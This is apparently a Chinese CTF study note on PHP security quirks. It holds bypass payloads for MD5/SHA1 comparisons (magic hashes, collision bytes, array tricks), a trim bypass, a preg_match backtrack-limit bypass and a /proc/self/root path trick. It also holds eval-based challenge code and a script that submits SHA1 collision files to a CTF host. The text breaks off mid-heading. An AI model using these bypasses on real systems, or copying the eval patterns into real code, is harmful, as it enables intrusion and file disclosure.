    <content type="html"><![CDATA[<h1 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h1><h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2><p>intval—-&gt;获取变量的整数值</p><pre class="language-php" data-language="php"><code class="language-php">intval <span class="token punctuation">(</span> mixed <span class="token variable">$var</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> int <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">10</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> int<span class="token variable">$var</span>    要转换成 integer 的数量值<span class="token variable">$base</span>    转化所使用的进制Note<span class="token punctuation">:</span>    如果 base 是 <span class="token number">0</span>，通过检测 <span class="token keyword">var</span> 的格式来决定使用的进制：    如果字符串包括了 <span class="token double-quoted-string string">"0x"</span> <span class="token punctuation">(</span>或 <span class="token double-quoted-string string">"0X"</span><span class="token punctuation">)</span> 的前缀，使用 <span class="token number">16</span> 进制 <span class="token punctuation">(</span>hex<span class="token punctuation">)</span>；否则，    如果字符串以 <span class="token double-quoted-string string">"0"</span> 开始，使用 <span class="token number">8</span> 进制<span class="token punctuation">(</span>octal<span class="token punctuation">)</span>；否则，    将使用 <span class="token number">10</span> 进制 <span class="token punctuation">(</span>decimal<span class="token punctuation">)</span>。</code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">// 42</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">4.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">// 4</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'42'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// 42</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'+42'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// 42</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'-42'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// -42</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">' 42'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// 42    </span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">042</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">// 34</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'042'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// 42</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">1e10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// 1410065408</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'1e10'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">// 1</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">0x1A</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// 26</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">42000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 42000000</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">420000000000000000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 0</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'420000000000000000000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2147483647</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment">// 42</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'42'</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// 34</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// 0</span><span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'foo'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'bar'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 1</span><span class="token delimiter important">?></span></span></code></pre><h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match"></a>preg_match</h2><pre class="language-php" data-language="php"><code class="language-php">Warning<span class="token punctuation">:</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token punctuation">)</span> expects parameter <span class="token number">2</span> to be string<span class="token punctuation">,</span> <span class="token keyword">array</span> given in <span class="token constant">D</span><span class="token punctuation">:</span>\<span class="token package">phpstudy_pro<span class="token punctuation">\</span>WWW<span class="token punctuation">\</span>test<span class="token punctuation">\</span>33</span><span class="token punctuation">.</span>php on line <span class="token number">4</span></code></pre><p>传数组会绕过匹配</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172353205.png"></p><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><ul><li><p>0e绕过</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'QNKCDZO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//0e830400451993494058024219903391</span>    <span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'240610708'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">//0e462097431906509019562988736854</span>    <span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'s878926199a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//0e545993274517709034328855841020</span>    <span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'s155964671a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//0e342768416822451524974117254469</span></span></code></pre></li><li><p>数组绕过</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//传入    a[]=1&amp;b[]=2     //数组时md5返回null</span></code></pre></li><li><p>强类型</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token variable">$a</span><span class="token operator">=</span><span class="token single-quoted-string string">'%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2'</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token single-quoted-string string">'%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>             <span class="token comment">//008ee33a9d58b51cfeb425b0959121c9</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>            <span class="token comment">//008ee33a9d58b51cfeb425b0959121c9</span><span class="token delimiter important">?></span></span></code></pre></li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$Param1</span><span class="token operator">=</span><span class="token double-quoted-string string">"\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2"</span><span class="token punctuation">;</span><span class="token variable">$Param2</span><span class="token operator">=</span><span class="token double-quoted-string string">"\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2"</span><span class="token punctuation">;</span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$data1</span><span class="token operator">=</span><span class="token double-quoted-string string">"\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70"</span><span class="token punctuation">;</span><span class="token variable">$data2</span><span class="token operator">=</span><span class="token double-quoted-string string">"\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70"</span><span class="token punctuation">;</span></code></pre><ul><li><pre><code class="php">$a==md5($a)    //0e215962017       --&gt;0e291242476940776845150308577824<pre class="language-none"><code class="language-none">* md5与SQL注入  * &#96;ffifdyop&#96;  * md5第二个参数为&#96;true&#96;时返回字符串  * &#96;&#96;&#96;php    echo md5(&#39;ffifdyop&#39;,true);          &#x2F;&#x2F;&#39;or&#39;6�]��!r,��b∟</code></pre></code></pre></li><li><p>sha1强类型比较</p><p><code>sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;])</code></p><p>除了数组</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestrotimi <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">"http://shattered.io/static/shattered-1.pdf"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span>letmein <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">"http://shattered.io/static/shattered-2.pdf"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://tc.rigelx.top:8003/baby_revenge.php'</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'user'</span><span class="token punctuation">:</span> rotimi<span class="token punctuation">,</span> <span class="token string">'pass'</span><span class="token punctuation">:</span> letmein<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token operator">//</span>来自：https<span class="token punctuation">:</span><span class="token operator">//</span>www<span class="token punctuation">.</span>linkedin<span class="token punctuation">.</span>com<span class="token operator">/</span>pulse<span class="token operator">/</span>using<span class="token operator">-</span>sha1<span class="token operator">-</span>collision<span class="token operator">-</span>attack<span class="token operator">-</span>solve<span class="token operator">-</span>bostonkeyparty<span class="token operator">-</span>ctf<span class="token operator">-</span>rotimi</code></pre></li></ul><h2 id="Reflectionclass"><a href="#Reflectionclass" class="headerlink" title="Reflectionclass"></a><a href="https://www.php.net/manual/zh/book.reflection.php">Reflectionclass</a></h2><pre class="language-php" data-language="php"><code class="language-php">//22.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">ice</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Fl4g</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&#123;Y0u_Get_1t&#125;!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>//33.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'22.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$ice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$x</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$y</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'y'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$x</span></span>('ice')<span class="token interpolation"><span class="token variable">$y</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172353893.png"></p><h2 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a><a href="https://www.php.net/manual/zh/class.exception.php">Exception</a></h2><p>—-&gt;异常处理</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'l'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span> <span class="token variable">$l</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'l'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'echo new $b($l());'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172353798.png"></p><h2 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a><a href="https://www.php.net/manual/zh/class.filesystemiterator.php">FilesystemIterator</a></h2><p>—–&gt;返回目录中文件名</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token comment">//----->取得当前工作目录</span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$it</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilesystemIterator</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$it</span> <span class="token keyword">as</span> <span class="token variable">$fileinfo</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$fileinfo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>           //11.php 22.php 33.php wowouploadimage-master</code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">FilesystemIterator</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>    //返回第一个文件名</code></pre><h2 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a><a href="https://www.php.net/manual/tr/directoryiterator.key.php">DirectoryIterator</a></h2><p>—–&gt;遍历目录</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$it</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$it</span> <span class="token keyword">as</span> <span class="token variable">$fileinfo</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$fileinfo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>                 //输出    . .. 11.php 22.php 33.php wowouploadimage-master</code></pre><h2 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="GLOBALS"></a>GLOBALS</h2><p>—-&gt;所有变量</p><h2 id="is-file"><a href="#is-file" class="headerlink" title="is_file"></a>is_file</h2><ul><li><code>is_file</code>函数可以用包装器，伪协议绕过</li></ul><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204172354709.png"></p><ul><li><p>目录溢出绕过</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>flag<span class="token punctuation">.</span>php</code></pre></li></ul><h2 id="compress-zlib"><a href="#compress-zlib" class="headerlink" title="compress.zlib://"></a><a href="https://www.php.net/manual/zh/wrappers.compression.php">compress.zlib://</a></h2><p><code>compress.zlib://</code>、   <code>compress.bzip2://</code>   和 <a href="https://www.php.net/manual/zh/function.gzopen.php">gzopen()</a>、<a href="https://www.php.net/manual/zh/function.bzopen.php">bzopen()</a>   是相等的。并且可以在不支持 fopencookie 的系统中使用。</p><pre class="language-php" data-language="php"><code class="language-php">file<span class="token operator">=</span>compress<span class="token punctuation">.</span>zlib<span class="token punctuation">:</span><span class="token comment">//flag.php</span></code></pre><h2 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h2><p><code>trim</code> — 去除字符串首尾处的空白字符（或者其他字符）</p><pre class="language-php" data-language="php"><code class="language-php">trim <span class="token punctuation">(</span> string <span class="token variable">$str</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> string <span class="token variable">$character_mask</span> <span class="token operator">=</span> <span class="token double-quoted-string string">" \t\n\r\0\x0B"</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> string</code></pre><p>此函数返回字符串 <code>str</code> 去除首尾空白字符后的结果。如果不指定第二个参数，<strong>trim()</strong> 将去除这些字符：</p><ul><li>“ “ (ASCII <em>32</em> (<em>0x20</em>))，普通空格符。</li><li>“\t” (ASCII <em>9</em> (<em>0x09</em>))，制表符。</li><li>“\n” (ASCII <em>10</em> (<em>0x0A</em>))，换行符。</li><li>“\r” (ASCII <em>13</em> (<em>0x0D</em>))，回车符。</li><li>“\0” (ASCII <em>0</em> (<em>0x00</em>))，空字节符。</li><li>“\x0B” (ASCII <em>11</em> (<em>0x0B</em>))，垂直制表符。</li></ul><p><code>%0c</code>(换页符)绕过</p><pre class="language-php" data-language="php"><code class="language-php">//?l=%0c36<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'l'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token single-quoted-string string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>bool(true)</code></pre><h2 id="get-include-files"><a href="#get-include-files" class="headerlink" title="get_include_files()"></a>get_include_files()</h2><p>—-&gt;返回返回被 <code>include </code>和 <code>require</code> 文件名的 <code>array</code></p><h2 id="implode"><a href="#implode" class="headerlink" title="implode()"></a>implode()</h2><p>—-&gt;将一个一维数组的值转化为字符串</p><h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p>—–&gt;返回由所有已定义变量所组成的数组</p><h2 id="get-defined-functions"><a href="#get-defined-functions" class="headerlink" title="get_defined_functions()"></a>get_defined_functions()</h2><p>—–&gt;返回所有已定义函数的数组(包括内置数组)</p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><ul><li><code>extract</code>— 从数组中将变量导入到当前的符号表</li><li><code>parse_str</code> — 将字符串解析成多个变量</li></ul><h2 id="变量名"><a href="#变量名" class="headerlink" title="变量名"></a>变量名</h2><p>变量名不能含有<code>空格</code>或<code>点</code>、<code>[</code>,会自动转为<code>_</code>      </p><p>只能转第一个，如变量名<code>1[2.com</code>转为<code>1_2.com</code></p><h2 id="gettext"><a href="#gettext" class="headerlink" title="gettext"></a>gettext</h2><p>—–&gt;打印字符串</p><p>别名<code>_</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">_</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"hello world"</span><span class="token punctuation">)</span></code></pre><h2 id="preg-match长度"><a href="#preg-match长度" class="headerlink" title="preg_match长度"></a>preg_match长度</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'puni'</span><span class="token punctuation">,</span><span class="token number">250000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'36Dpunish'</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/.+?punish/is'</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">//bool(false)</span><span class="token comment">//echo $b;</span><span class="token delimiter important">?></span></span></code></pre><h2 id="PHP数组溢出"><a href="#PHP数组溢出" class="headerlink" 